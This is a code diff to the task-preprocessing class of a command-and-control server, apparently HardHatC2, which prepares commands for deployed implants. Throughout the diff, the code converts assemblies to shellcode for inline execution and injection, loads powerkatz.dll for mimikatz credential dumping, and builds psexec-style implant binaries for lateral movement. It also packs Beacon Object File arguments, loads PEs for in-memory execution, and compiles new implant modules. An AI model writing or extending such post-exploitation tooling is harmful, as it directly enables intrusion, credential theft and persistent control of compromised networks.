@@ -6,6 +6,7 @@ using System.Linq;
 using System.Reflection;
 using System.Threading.Tasks;
 using ApiModels.Requests;
+using Mono.Cecil;
 using Newtonsoft.Json;
 using RestSharp;
 using TeamServer.Controllers;
@@ -14,16 +15,17 @@ using TeamServer.Models.Engineers;
 using TeamServer.Models.Extras;
 using TeamServer.Services;
 using TeamServer.Services.Handle_Implants;
+//using DynamicEngLoading;
 
 namespace TeamServer.Utilities
 {
     public class Engineer_TaskPreProcess
     {
-        public static List<string> CommandsThatNeedPreProc = new List<string> { "shellcode", "inlineAssembly", "loadassembly", "sleep", "powershell_import", "upload", "spawn", "inject", "jump", "inlinedll", "mimikatz","socks","rportforward","executeassembly","addcommand"};
+        public static List<string> CommandsThatNeedPreProc = new List<string> { "inlineshellcode", "inlineAssembly", "loadassembly", "sleep", "powershell_import", "upload", "spawn", "inject", "jump", "inlinedll", "mimikatz","socks","rportforward","executeassembly","addcommand","addmodule", "execute_bof", "execute_pe" };
 
         public static async Task PreProcessTask(EngineerTask currentTask, Engineer engineer)
         {
-
+            
             //if command is proxy call the Socks4Proxy class to make a proxy
             if (currentTask.Command.Equals("socks",StringComparison.CurrentCultureIgnoreCase))
             {
@@ -76,21 +78,38 @@ namespace TeamServer.Utilities
             }
 
             // if the most recent engineerTask in taskList Command is shellcode, invoke the Shellcode.AssemToShellcode function, pass in the task.Arguments[0] and task.Arguments[1]
-            else if (currentTask.Command.Equals("shellcode", StringComparison.CurrentCultureIgnoreCase))
+            else if (currentTask.Command.Equals("inlineshellcode", StringComparison.CurrentCultureIgnoreCase))
             {
-                //split the arguments into two strings at the first space
+                byte[] shellcode;
                 currentTask.Arguments.TryGetValue("/program", out string program);
                 currentTask.Arguments.TryGetValue("/args", out string arguments);
-                var shellcode = Shellcode.AssemToShellcode(program, arguments);
-                currentTask.File = shellcode;
+                //split the arguments into two strings at the first space
+                if (currentTask.Arguments.TryGetValue("/local", out string _))
+                {
+                    //if local then the file name and shellcode came from the client 
+                    //need to extract the name of the file from the program string 
+                    string filename = Path.GetFileName(program);
+
+                    shellcode = Shellcode.AssemToShellcode(currentTask.File, filename, arguments);
+                    currentTask.File = shellcode;
+                }
+                else
+                {
+                    shellcode = Shellcode.AssemToShellcode(program, arguments);
+                    currentTask.File = shellcode;
+                }
             }
 
             //if command is inlineAssembly then read the specified file argument and convert it to a byte array and add it to the task.Arguments dictionary
             else if (currentTask.Command.Equals("inlineAssembly", StringComparison.CurrentCultureIgnoreCase))
             {
                 currentTask.Arguments.TryGetValue("/file", out string filepath);
+                if (currentTask.Arguments.TryGetValue("/local", out string _))
+                {
+                    return; 
+                }
                 //if filepath is not a real file path then use the default programs folder 
-                if(!File.Exists(filepath))
+                if (!File.Exists(filepath))
                 {
                     // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
                     char allPlatformPathSeperator = Path.DirectorySeparatorChar;
@@ -109,6 +128,14 @@ namespace TeamServer.Utilities
                 //split the arguments into two strings at the first space
                 currentTask.Arguments.TryGetValue("/file", out string program);
                 currentTask.Arguments.TryGetValue("/args", out string arguments);
+                if (currentTask.Arguments.TryGetValue("/local", out string _))
+                {
+                    //if local then the file name and shellcode came from the client
+                    //need to extract the name of the file from the program string
+                    string filename = Path.GetFileName(program);
+                    Shellcode.AssemToShellcode(currentTask.File, filename, arguments);
+                    return;
+                }
                 if (!File.Exists(program))
                 {
                     // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
@@ -125,6 +152,10 @@ namespace TeamServer.Utilities
             //if command is inlineAssembly then read the specified file argument and convert it to a byte array and add it to the task.Arguments dictionary
             else if (currentTask.Command.Equals("loadassembly", StringComparison.CurrentCultureIgnoreCase))
             {
+                if (currentTask.Arguments.TryGetValue("/local", out string _))
+                {
+                    return;
+                }
                 currentTask.Arguments.TryGetValue("/file", out string filepath);
                 filepath = filepath.TrimStart(' ');
                 var fileContent = System.IO.File.ReadAllBytes(filepath);
@@ -141,6 +172,10 @@ namespace TeamServer.Utilities
             //if command is powershell_import read file at /import and turn it into a base64 string and add it to the task.Arguments dictionary with the key /script
             else if (currentTask.Command.Equals("powershell_import", StringComparison.CurrentCultureIgnoreCase))
             {
+                if (currentTask.Arguments.TryGetValue("/local", out string _))
+                {
+                    return;
+                }
                 currentTask.Arguments.TryGetValue("/import", out string filepath);
                 filepath = filepath.TrimStart(' ');
                 var fileContent = System.IO.File.ReadAllBytes(filepath);
@@ -153,8 +188,11 @@ namespace TeamServer.Utilities
                 currentTask.Arguments.TryGetValue("/dest", out string dest);
                 currentTask.Arguments.TryGetValue("/file", out string filepath);
                 filepath = filepath.TrimStart(' ');
-                var fileContent = System.IO.File.ReadAllBytes(filepath);
-                currentTask.File = fileContent;
+                if (!currentTask.Arguments.TryGetValue("/local", out string _))
+                {
+                    var fileContent = System.IO.File.ReadAllBytes(filepath);
+                    currentTask.File = fileContent;
+                }
                 IOCFile _Pending = new IOCFile();
                 _Pending.Name = Path.GetFileName(filepath);
                 _Pending.UploadedPath = dest;
@@ -181,7 +219,7 @@ namespace TeamServer.Utilities
                 string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                 string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path D:\my_Custom_code\HardHatC2\Teamserver\ 
                 pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
-                string filepath = Directory.GetFiles(pathSplit[0] + "temp" + $"{allPlatformPathSeperator}", $"Engineer_{manager}_merged.exe").FirstOrDefault();
+                string filepath = Directory.GetFiles(pathSplit[0] + ".." + $"{allPlatformPathSeperator}", $"PostExEngineer_{manager}.exe").FirstOrDefault();
 
                 var shellcode = Shellcode.AssemToShellcode(filepath, arguments);
                 //convert byte array into a base64 string
@@ -204,7 +242,7 @@ namespace TeamServer.Utilities
                 string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                 string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path D:\my_Custom_code\HardHatC2\Teamserver\ 
                 pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
-                string filepath = Directory.GetFiles(pathSplit[0] + "temp" + $"{allPlatformPathSeperator}", $"Engineer_{manager}_merged.exe").FirstOrDefault();
+                string filepath = Directory.GetFiles(pathSplit[0] +".." + $"{allPlatformPathSeperator}", $"PostExEngineer_{manager}.exe").FirstOrDefault();
 
                 var shellcode = Shellcode.AssemToShellcode(filepath, arguments);
                 //convert byte array into a base64 string
@@ -229,63 +267,33 @@ namespace TeamServer.Utilities
                 pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
                 string filepath = "";
 
-                //might change later but would need to update jump methods to use shellcode injection instead of writing a file to disk.
-
-                //var shellcode = Shellcode.AssemToShellcode(filepath, arguments);
-                ////convert byte array into a base64 string
-                //var shellcodeString = Convert.ToBase64String(shellcode);
-                ////update the task to have the shellcode as an argument
-                //currentTask.Arguments.Add("/binary", shellcodeString);
-
-                
-                //find the manager in the managers list and use ots ptoperties to make a SpawnEngineerRequest 
-                var managerToJumpTo = managerService._managers.FirstOrDefault(m => m.Name.Equals(manager, StringComparison.CurrentCultureIgnoreCase));
-                if (managerToJumpTo == null)
-                {
-                    Console.WriteLine($"manager {manager} not found");
-                    return;
-                }
-                SpawnEngineerRequest JumpRequest = new SpawnEngineerRequest();
-                JumpRequest.managerName = managerToJumpTo.Name;
-                JumpRequest.Sleep = engineer.engineerMetadata.Sleep;
-                JumpRequest.ConnectionAttempts = 1000;
-
                 if (currentTask.Arguments.TryGetValue("/method", out string method))
                 {
-                    method = method.TrimStart(' ');
-                    method = method.TrimEnd(' ');
+                    method = method.Trim();
                     if (method.Equals("psexec", StringComparison.CurrentCultureIgnoreCase))
                     {
-                        JumpRequest.complieType = SpawnEngineerRequest.EngCompileType.serviceexe;
-                        filepath = pathSplit[0] + ".."  + $"{allPlatformPathSeperator}" + $"Engineer_{manager}_service.exe";
+                        filepath = pathSplit[0] + ".."  + $"{allPlatformPathSeperator}" + $"PostExEngineer_{manager}_service.exe";
                     }
                     else
                     {
-                        JumpRequest.complieType = SpawnEngineerRequest.EngCompileType.exe;
-                        filepath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}" + $"Engineer_{manager}.exe";
+                        filepath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}" + $"PostExEngineer_{manager}.exe";
                     }
                 }
                 else
                 {
-                    JumpRequest.complieType = SpawnEngineerRequest.EngCompileType.exe;
-                    filepath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}" + $"Engineer_{manager}.exe";
+                    filepath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}" + $"PostExEngineer_{manager}.exe";
                 }
-                bool isCreated = EngineerService.CreateEngineers(JumpRequest);
-                if (isCreated)
-                {
-                    //read the file at filepath and turn it into a base64 string and add it to the task.Arguments dictionary with the key /binary
-                    var fileContent = System.IO.File.ReadAllBytes(filepath);
-                    currentTask.File = fileContent;
-                }
-                else
-                {
-                    Console.WriteLine($"failed to create engineer {manager}");
-                }
-            }
+                var fileContent = System.IO.File.ReadAllBytes(filepath);
+                currentTask.File = fileContent;
+        }
 
             //if command is inlinedll take the /dll argument, read the file into a byte array, and convert that into a base64 string and replace the /dll value with this new string
             else if (currentTask.Command.Equals("inlinedll", StringComparison.CurrentCultureIgnoreCase))
             {
+                if (currentTask.Arguments.TryGetValue("/local", out string _))
+                {
+                    return;
+                }
                 currentTask.Arguments.TryGetValue("/dll", out string dllpath);
                 dllpath = dllpath.TrimStart(' ');
                 var fileContent = System.IO.File.ReadAllBytes(dllpath);
@@ -300,7 +308,7 @@ namespace TeamServer.Utilities
                 string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                 string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path location\HardHatC2\Teamserver\ 
                 pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
-                string filepath = Directory.GetFiles(pathSplit[0] + "programs" + $"{allPlatformPathSeperator}" + "builtin" + $"{allPlatformPathSeperator}", $"powerkatz.dll").FirstOrDefault();
+                string filepath = Directory.GetFiles(pathSplit[0] + "Programs" + $"{allPlatformPathSeperator}" + "Builtin" + $"{allPlatformPathSeperator}", $"powerkatz.dll").FirstOrDefault();
                 var fileContent = System.IO.File.ReadAllBytes(filepath);
                 currentTask.File = fileContent;
 
@@ -315,19 +323,182 @@ namespace TeamServer.Utilities
                 string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                 string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path location\HardHatC2\Teamserver\ 
                 pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
-                string StoredCommandFolder = pathSplit[0] + "Models" + $"{allPlatformPathSeperator}" + "Engineers" + $"{allPlatformPathSeperator}" + "EngineerCommands" + $"{allPlatformPathSeperator}";
+                string StoredCommandFolder = pathSplit[0] + ".." + allPlatformPathSeperator + "Engineer" + allPlatformPathSeperator + "Commands" + allPlatformPathSeperator;
 
                 currentTask.Arguments.TryGetValue("/command", out string command);
                 command = command.TrimStart(' ');
                 //find the matching .cs file in the EngineerCommands folder
-                string filepath = Directory.GetFiles(StoredCommandFolder, $"{command}.json").FirstOrDefault();
+                EnumerationOptions options = new EnumerationOptions();
+                options.MatchCasing = MatchCasing.CaseInsensitive;
+                string filepath = Directory.GetFiles(StoredCommandFolder, $"{command}.cs",options).FirstOrDefault();
                 //read the file content and make it into a EngineerCommand object
                 var fileContent = System.IO.File.ReadAllText(filepath);
+                //use the CompilerService to compile the file into a dll
+                byte[] AssemblyBytes = Compile.CompileCommands(fileContent);
+
+                currentTask.File = AssemblyBytes;
+            }
+
+            else if (currentTask.Command.Equals("AddModule", StringComparison.CurrentCultureIgnoreCase))
+            {
+                try
+                {
+                    char allPlatformPathSeperator = Path.DirectorySeparatorChar;
+                    string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+                    string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path location\HardHatC2\Teamserver\ 
+                    pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
+                    string StoredModuleFolder = pathSplit[0] + ".." + allPlatformPathSeperator + "Engineer" + allPlatformPathSeperator + "Modules" + allPlatformPathSeperator;
+
+                    currentTask.Arguments.TryGetValue("/module", out string module);
+                    module = module.Trim();
+                    //find the matching .cs file in the EngineerCommands folder
+                    EnumerationOptions options = new EnumerationOptions();
+                    options.MatchCasing = MatchCasing.CaseInsensitive;
+                    string filepath = Directory.GetFiles(StoredModuleFolder, $"{module}.cs",options).FirstOrDefault();
+                    //read the file content and make it into a EngineerCommand object
+                    var fileContent = System.IO.File.ReadAllText(filepath);
+                    //use the CompilerService to compile the file into a dll
+                    byte[] AssemblyBytes = Compile.CompileCommands(fileContent);
+
+                    currentTask.File = AssemblyBytes;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error adding module: {ex.Message}");
+                }
                 
-                //make a new object that inherits from EngineerCommand and has the same name as the command
-                var serializedCommand = JsonConvert.DeserializeObject<EngineerCommand>(fileContent);
-                byte[] seralizedCommandBytes = serializedCommand.Serialize();
-                currentTask.File = seralizedCommandBytes;
+            }
+            else if(currentTask.Command.Equals("execute_bof",StringComparison.CurrentCultureIgnoreCase))
+            {
+                try
+                {
+
+                    currentTask.Arguments.TryGetValue("/file", out string filepath);
+                    if (currentTask.Arguments.TryGetValue("/local", out string _))
+                    {
+                        return;
+                    }
+                    //if filepath is not a real file path then use the default programs folder 
+                    if (!File.Exists(filepath))
+                    {
+                        // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
+                        char allPlatformPathSeperator = Path.DirectorySeparatorChar;
+                        string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+                        string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path HardHatC2\Teamserver\ 
+                        pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
+                        filepath = pathSplit[0] + "Programs" + allPlatformPathSeperator + "Users" + allPlatformPathSeperator + filepath;
+                    }
+
+                    filepath = filepath.TrimStart(' ');
+                    var fileContent = System.IO.File.ReadAllBytes(filepath);
+                    currentTask.File = fileContent;
+
+                    //get the /bof_string argument
+                    currentTask.Arguments.TryGetValue("/argtypes", out string bof_string);
+                    //get the /bof_arg argument
+                    currentTask.Arguments.TryGetValue("/args", out string bof_arg);
+                    string hexString;
+                    List<object> argList = new List<object>();
+                    List<string> argTypeList = bof_string.Select(c => c.ToString()).ToList();
+                    List<string> bofArgList = bof_arg.Split(' ').ToList();
+                    for(int i=0; i<bofArgList.Count; i++)
+                    {
+                        string args = bofArgList[i];
+                        var argType = argTypeList[i];
+                        if (argType == "b")
+                        {
+                            //if this is the case then the arg is a byte array and we should convert it and add it to the argList 
+                            //first we need to remove the brackets from the string
+                            string arg = args.TrimStart('[');
+                            arg = arg.TrimEnd(']');
+                            //now we need to split the string on the commas
+                            List<string> byteStringList = arg.Split(',').ToList();
+                            //now we need to convert each string to a byte and add it to a byte array
+                            byte[] byteArray = new byte[byteStringList.Count];
+                            for (int j = 0; j < byteStringList.Count; j++)
+                            {
+                                byteArray[j] = Convert.ToByte(byteStringList[j]);
+                            }
+                            byte[] argValue = byteArray;
+                            argList.Add(argValue);
+                            
+                        }
+                        else if (argType == "i")
+                        {
+                            //if this is the case then the arg is an int and we should convert it and add it to the argList
+                            int argValue = Convert.ToInt32(args);
+                            argList.Add(argValue);
+
+                        }
+                        else if (argType == "s")
+                        {
+                            //if this is the case then the arg is a short and we should add it to the argList
+                            short argValue = Convert.ToInt16(args);
+                            argList.Add(argValue);
+
+                        }
+                        else if (argType == "z")
+                        {
+                            // if this is the case then the arg is a string and we should add it to the argList
+                            argList.Add(args);
+
+                        }
+                        else if (argType == "Z")
+                        {
+                            // if this is the case then the arg is a wide string and we should add it to the argList
+                            argList.Add(args);
+                        }
+                    }
+
+                   bool result = bof_pack.Bof_Pack(bof_string, argList, out hexString);
+                    if(result)
+                    {
+                        currentTask.Arguments.Add("/bof_hex", hexString);
+                        Console.WriteLine($"Packing successful");
+                        Console.WriteLine($"Hex string: {hexString}");
+                    }
+                    else
+                    {
+                        Console.WriteLine($"Packing failed");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error in bof packer: {ex.Message}");
+                    Console.WriteLine(ex.StackTrace);
+
+                }
+            }
+            else if (currentTask.Command.Equals("execute_pe", StringComparison.CurrentCultureIgnoreCase))
+            {
+                try
+                {
+
+                    currentTask.Arguments.TryGetValue("/file", out string filepath);
+                    if (currentTask.Arguments.TryGetValue("/local", out string _))
+                    {
+                        return;
+                    }
+                    //if filepath is not a real file path then use the default programs folder 
+                    if (!File.Exists(filepath))
+                    {
+                        // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
+                        char allPlatformPathSeperator = Path.DirectorySeparatorChar;
+                        string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+                        string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path HardHatC2\Teamserver\ 
+                        pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
+                        filepath = pathSplit[0] + "Programs" + allPlatformPathSeperator + "Users" + allPlatformPathSeperator + filepath;
+                    }
+                    filepath = filepath.TrimStart(' ');
+                    var fileContent = System.IO.File.ReadAllBytes(filepath);
+                    currentTask.File = fileContent;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error in bof packer: {ex.Message}");
+                    Console.WriteLine(ex.StackTrace);
+
+                }
             }
         }
     }
